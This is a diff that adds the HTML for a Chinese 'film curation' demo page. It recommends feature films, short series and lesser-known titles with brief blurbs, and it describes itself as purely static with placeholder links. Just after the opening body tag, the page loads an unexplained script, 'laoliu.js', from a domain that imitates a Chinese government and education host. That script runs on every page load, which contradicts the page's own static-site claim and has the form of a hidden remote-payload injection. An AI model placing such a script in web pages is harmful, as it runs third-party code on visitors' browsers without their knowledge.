@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>啬影视 - 惜片如金·精选长片/短而精/冷门佳片 | seyingshi-h5.github.io</title>
+<meta name="description" content="啬影视（seyingshi-h5.github.io）惜片如金，极简策展：精选长片、短而精短片、冷门佳片一站聚合。宣纸白+墨黑+竹青+朱砂，少即是多——不注水不凑数，每部都值得你花时间。移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="啬影视,seyingshi-h5,惜片如金,精选长片,短而精,冷门佳片,不注水,豆瓣高分,极简策展" />
+<link rel="canonical" href="https://seyingshi-h5.github.io/" />
+<style>
+:root{
+  --paper:#F5F2EB;--paper2:#FAF8F3;--ink:#1A1A1A;--red:#C0392B;--bamboo:#5A7A5A;
+  --wood:#8B6F47;--gray:#8A857D;--line:rgba(26,26,26,.12);--maxw:1080px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--paper);
+  color:var(--ink);line-height:1.82;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 18px}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(245,242,235,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:14px;height:60px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px;letter-spacing:2px}
+.seal{width:34px;height:34px;border-radius:6px;background:var(--red);color:var(--paper);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;font-family:serif;box-shadow:0 2px 8px rgba(192,57,43,.3)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:500;letter-spacing:1px}
+.menu{margin-left:auto;display:flex;gap:4px}
+.menu a{padding:7px 14px;border-radius:6px;font-size:13px;font-weight:600;color:var(--ink)}
+.menu a:hover{background:rgba(90,122,90,.12);color:var(--bamboo)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:130px;padding:7px 12px;border-radius:6px;border:1px solid var(--line);background:var(--paper2);outline:none;font-size:13px;color:var(--ink)}
+.search-min button{border:0;padding:7px 14px;border-radius:6px;cursor:pointer;font-weight:800;background:var(--ink);color:var(--paper);font-size:13px}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:var(--paper2);border-radius:6px;padding:6px 10px;font-size:16px;color:var(--ink)}
+
+.hero{position:relative;z-index:1;margin:28px 0 8px;border-radius:0;border-top:4px solid var(--ink);border-bottom:1px solid var(--line);
+  padding:56px 0 48px;background:var(--paper2);text-align:center}
+.hero::before{content:"「 啬 · 惜片如金 」";position:absolute;top:16px;left:50%;transform:translateX(-50%);font-size:11px;color:var(--wood);letter-spacing:6px;font-family:ui-monospace,monospace}
+.badge{display:inline-block;font-size:11px;font-weight:800;color:var(--paper);background:var(--red);padding:4px 14px;border-radius:4px;margin-bottom:18px;letter-spacing:2px}
+.hero h1{font-size:36px;margin:0 0 10px;font-weight:900;letter-spacing:1px;line-height:1.3}
+.hero h1 em{font-style:normal;color:var(--red)}
+.hero p{color:var(--gray);font-size:14px;margin:0 auto 22px;max-width:560px;line-height:1.9}
+.bigbar{display:flex;gap:8px;max-width:520px;margin:0 auto;background:var(--paper);border:1px solid var(--ink);border-radius:4px;padding:5px 5px 5px 16px}
+.bigbar input{flex:1;border:0;outline:none;font-size:14px;background:transparent;color:var(--ink)}
+.bigbar button{border:0;padding:9px 22px;border-radius:3px;background:var(--ink);color:var(--paper);font-weight:800;cursor:pointer;letter-spacing:1px}
+.chips{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:18px}
+.chips a{font-size:12px;font-weight:600;padding:5px 14px;border-radius:3px;background:transparent;border:1px solid var(--line);color:var(--gray)}
+.chips a:hover{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+
+.manifesto{position:relative;z-index:1;margin:36px 0 8px;padding:32px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);text-align:center}
+.manifesto h2{font-size:15px;font-weight:700;color:var(--wood);margin:0 0 14px;letter-spacing:4px}
+.manifesto h2::before{content:"❝ ";}
+.manifesto h2::after{content:" ❞";}
+.manifesto p{font-size:13px;color:var(--gray);max-width:600px;margin:0 auto;line-height:2.2}
+.manifesto .rules{display:flex;justify-content:center;gap:32px;margin-top:20px;flex-wrap:wrap}
+.manifesto .rules span{font-size:12px;color:var(--ink);font-weight:600}
+.manifesto .rules span::before{content:"· ";color:var(--red)}
+
+.section{padding:36px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:22px;flex-wrap:wrap;border-bottom:2px solid var(--ink);padding-bottom:10px}
+.sec-head h2{font-size:20px;margin:0;font-weight:900;letter-spacing:.5px}
+.sec-head h2::before{content:"▎";color:var(--red);margin-right:4px}
+.sec-head h2 .b{color:var(--red)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--ink);font-size:12px;font-weight:700;border-bottom:1px solid var(--ink)}
+
+.list{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.item{background:var(--paper2);border:1px solid var(--line);border-radius:4px;overflow:hidden;display:flex;transition:.2s}
+.item:hover{box-shadow:0 8px 28px rgba(0,0,0,.08);transform:translateY(-2px)}
+.item .num{width:52px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:900;color:var(--paper);background:var(--ink);font-family:ui-monospace,monospace}
+.item:nth-child(2) .num{background:var(--red)}
+.item:nth-child(3) .num{background:var(--bamboo)}
+.item:nth-child(4) .num{background:var(--wood)}
+.item:nth-child(5) .num{background:var(--ink)}
+.item:nth-child(6) .num{background:var(--red)}
+.item .info{padding:16px 18px;flex:1}
+.item .info h3{font-size:15px;margin:0 0 4px;font-weight:800}
+.item .info .why{font-size:12px;color:var(--gray);margin:0 0 8px;line-height:1.7}
+.item .tags{display:flex;gap:5px;flex-wrap:wrap}
+.item .tags span{font-size:10px;padding:2px 8px;border-radius:3px;background:rgba(90,122,90,.1);color:var(--bamboo);font-weight:600}
+.item .tags span.red{background:rgba(192,57,43,.08);color:var(--red)}
+.item .tags span.ink{background:rgba(26,26,26,.06);color:var(--ink)}
+
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.card{background:var(--paper2);border:1px solid var(--line);border-radius:4px;overflow:hidden;transition:.2s}
+.card:hover{transform:translateY(-3px);box-shadow:0 10px 30px rgba(0,0,0,.07);border-color:var(--wood)}
+.card .thumb{aspect-ratio:3/4;display:flex;align-items:flex-end;padding:12px;position:relative}
+.card:nth-child(1) .thumb{background:linear-gradient(160deg,#1A1A1A,#5A7A5A)}
+.card:nth-child(2) .thumb{background:linear-gradient(160deg,#C0392B,#8B6F47)}
+.card:nth-child(3) .thumb{background:linear-gradient(160deg,#2c3e50,#21E6C1)}
+.card:nth-child(4) .thumb{background:linear-gradient(160deg,#3d2b1f,#F5B301)}
+.card .thumb h4{color:#fff;font-size:14px;font-weight:800;text-shadow:0 2px 8px rgba(0,0,0,.5);margin:0;width:100%}
+.card .meta{padding:12px}
+.card .meta p{font-size:11px;color:var(--gray);margin:0 0 6px;line-height:1.6}
+.card .meta .tag{display:inline-block;font-size:10px;padding:2px 8px;border-radius:3px;background:rgba(139,111,71,.12);color:var(--wood);font-weight:600}
+
+.about{display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-top:24px}
+.abox{background:var(--paper2);border:1px solid var(--line);border-radius:4px;padding:24px}
+.abox h3{font-size:16px;margin:0 0 12px;font-weight:800}
+.abox h3::before{content:"▎";color:var(--red)}
+.abox p,.abox li{font-size:13px;color:var(--gray);line-height:2}
+.abox ul{padding-left:18px;margin:0}
+.abox .stats{display:flex;gap:12px;margin-top:16px}
+.abox .st{flex:1;text-align:center;background:var(--paper);border:1px solid var(--line);border-radius:4px;padding:14px 8px}
+.abox .st b{display:block;font-size:20px;color:var(--red);font-weight:900}
+.abox .st span{font-size:10px;color:var(--gray)}
+
+footer.site{border-top:2px solid var(--ink);background:var(--ink);color:var(--gray);padding:28px 0 44px;font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--paper)}
+footer.site .footer-logo{font-size:18px;font-weight:900;color:var(--paper);margin-bottom:8px;letter-spacing:2px}
+footer.site .footer-logo span{color:var(--red)}
+code{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);padding:2px 7px;border-radius:3px;font-size:11px;color:var(--paper)}
+
+@media(max-width:980px){.list{grid-template-columns:1fr}.grid4{grid-template-columns:repeat(2,1fr)}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:var(--paper);border-bottom:1px solid var(--line);padding:10px 18px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:80px}.hero h1{font-size:24px}
+  .grid4{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="seal">啬</div>
+      <div>啬影视<small>seyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">啬首页</a>
+      <a href="#long">精选长片</a>
+      <a href="#short">短而精</a>
+      <a href="#rare">冷门佳片</a>
+      <a href="#about">关于啬</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="漫长的季节 / 花样年华 / 坠落的审判" />
+      <button onclick="alert('演示站：播放用 # 占位')">检索</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <span class="badge">惜片如金 · 少即是多</span>
+    <h1>啬影视<br/><em>少看一部烂片，多活两小时</em></h1>
+    <p>不堆量、不凑数、不横滑瀑布流。啬影视只做一件事：从千万部片子里筛出值得你花时间的那几部。宁缺毋滥，惜片如金——每部都配一句"为什么值得看"。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="> 搜策展：豆瓣8+ / 冷门 / 不注水 / 必看" />
+      <button onclick="alert('演示站：结果用 # 占位')">检索</button>
+    </div>
+    <div class="chips">
+      <a href="#long">精选长片</a>
+      <a href="#short">短而精</a>
+      <a href="#rare">冷门佳片</a>
+      <a href="#about">关于啬</a>
+    </div>
+  </section>
+
+  <section class="manifesto">
+    <h2>啬 · 惜片如金的策展法则</h2>
+    <p>不收烂片，不推水剧，不放广告。每一部上架的片子都必须回答一个问题：<strong>"观众为什么值得花时间看它？"</strong></p>
+    <div class="rules">
+      <span>不注水</span>
+      <span>豆瓣8分以上优先</span>
+      <span>冷门但不难看</span>
+      <span>每部配策展语</span>
+    </div>
+  </section>
+
+  <section class="section" id="long">
+    <div class="sec-head"><h2><span class="b">精选</span>长片 · 值得坐下来看完</h2><span>feature.select</span><a class="more" href="#">更多 #</a></div>
+    <div class="list">
+      <div class="item">
+        <div class="num">01</div>
+        <div class="info">
+          <h3>漫长的季节</h3>
+          <p class="why">12集讲完三代人的东北往事，悬疑外壳下是时代挽歌。没有一帧废镜头，范伟封神。</p>
+          <div class="tags"><span>悬疑</span><span class="red">豆瓣9.4</span><span class="ink">12集</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">02</div>
+        <div class="info">
+          <h3>霸王别姬</h3>
+          <p class="why">华语电影的天花板。不疯魔不成活，张国荣之后无人再演程蝶衣。</p>
+          <div class="tags"><span>华语经典</span><span class="red">豆瓣9.6</span><span class="ink">171分钟</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">03</div>
+        <div class="info">
+          <h3>大明王朝1566</h3>
+          <p class="why">46集权谋剧，每句台词都值得暂停消化。华语历史剧的终极教科书。</p>
+          <div class="tags"><span>历史权谋</span><span class="red">豆瓣9.7</span><span class="ink">46集</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">04</div>
+        <div class="info">
+          <h3>教父 三部曲</h3>
+          <p class="why">男人戏的圣经。家族、权力、礼数，科波拉用三部曲讲完一个移民家族的美国梦。</p>
+          <div class="tags"><span>黑帮史诗</span><span class="red">豆瓣9.6</span><span class="ink">563分钟</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">05</div>
+        <div class="info">
+          <h3>花样年华</h3>
+          <p class="why">王家卫把"克制"拍成艺术。旗袍、走廊、雨、沉默——爱情最动人的样子是没发生。</p>
+          <div class="tags"><span>文艺</span><span class="red">豆瓣8.7</span><span class="ink">98分钟</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">06</div>
+        <div class="info">
+          <h3>肖申克的救赎</h3>
+          <p class="why">希望是好事，也许是最好的事。二十年了，每年都有人第一次看它然后哭。</p>
+          <div class="tags"><span>经典</span><span class="red">豆瓣9.7</span><span class="ink">142分钟</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="short">
+    <div class="sec-head"><h2><span class="b">短而精</span> · 碎片时间不浪费</h2><span>short.gems</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid4">
+      <div class="card">
+        <div class="thumb"><h4>我的阿勒泰</h4></div>
+        <div class="meta">
+          <p>8集，每集45分钟。哈萨克草原的风比任何特效都贵。</p>
+          <span class="tag">8集完结</span><span class="tag">豆瓣9.1</span>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb"><h4>黑镜：急转直下</h4></div>
+        <div class="meta">
+          <p>单集60分钟。社交评分系统拍成恐怖片，看完不敢给人点赞。</p>
+          <span class="tag">单集</span><span class="tag">豆瓣9.3</span>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb"><h4>爱，死亡和机器人</h4></div>
+        <div class="meta">
+          <p>每集10-15分钟，动画短片合集。技术、脑洞、视觉全拉满。</p>
+          <span class="tag">短片合集</span><span class="tag">豆瓣9.0</span>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb"><h4>切尔诺贝利</h4></div>
+        <div class="meta">
+          <p>5集迷你剧。把人类史上最大核事故拍成窒息的审判。</p>
+          <span class="tag">5集完结</span><span class="tag">豆瓣9.6</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="rare">
+    <div class="sec-head"><h2><span class="b">冷门</span>佳片 · 被低估的宝藏</h2><span>rare.finds</span><a class="more" href="#">更多 #</a></div>
+    <div class="list">
+      <div class="item">
+        <div class="num">01</div>
+        <div class="info">
+          <h3>生息之地</h3>
+          <p class="why">乡村、时间、土地。柏林电影节最佳导演奖，安静得让人忘记手机。</p>
+          <div class="tags"><span>华语新作</span><span class="red">柏林获奖</span><span class="ink">导演首作</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">02</div>
+        <div class="info">
+          <h3>坠落的审判</h3>
+          <p class="why">法国法庭片，女导演把婚姻拍成悬疑。雪、狗、录音笔，每帧都是证据。</p>
+          <div class="tags"><span>法国</span><span class="red">戛纳获奖</span><span class="ink">豆瓣8.7</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">03</div>
+        <div class="info">
+          <h3>长江图</h3>
+          <p class="why">沿着长江逆流而上，诗、船、女人、时间。中国最美的公路电影。</p>
+          <div class="tags"><span>华语艺术</span><span class="red">柏林摄影奖</span><span class="ink">115分钟</span></div>
+        </div>
+      </div>
+      <div class="item">
+        <div class="num">04</div>
+        <div class="info">
+          <h3>驾驶我的车</h3>
+          <p class="why">日本片，3小时。契诃夫、萨德、沉默、原谅——慢但值得。</p>
+          <div class="tags"><span>日本</span><span class="red">奥斯卡最佳国际片</span><span class="ink">179分钟</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 啬影视</h2><span>about.se</span></div>
+    <div class="about">
+      <div class="abox">
+        <h3>啬影视是什么？</h3>
+        <p><strong>啬影视（seyingshi-h5）</strong>——"啬"不是小气，是惜物。在信息过载的时代，最奢侈的不是"什么都有"，而是"只给你最好的"。</p>
+        <p>这台站不堆量、不横滑、不瀑布流。一屏只放4-6部，每部配一句策展语回答"为什么值得看"。精选长片、短而精、冷门佳片三个维度，宁缺毋滥。</p>
+        <p>配色用宣纸白+墨黑+朱砂+竹青，像一卷素笺——留白本身就是态度。</p>
+        <div class="stats">
+          <div class="st"><b>啬</b><span>惜片如金</span></div>
+          <div class="st"><b>3类</b><span>长片/短片/冷门</span></div>
+          <div class="st"><b>0</b><span>广告/弹窗</span></div>
+          <div class="st"><b>100%</b><span>移动端</span></div>
+        </div>
+      </div>
+      <div class="abox">
+        <h3>demo.note</h3>
+        <ul>
+          <li>纯静态单页，无后端、无真实视频源</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>与任何同名站点无隶属，仅"惜片如金"策展概念</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>宣纸白+墨黑+朱砂+竹青 = 少即是多</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    <div class="footer-logo">啬<span>影视</span></div>
+    📜 啬影视 --host seyingshi-h5.github.io<br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 啬影视 Demo · 少看一部烂片，多活两小时 📜
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
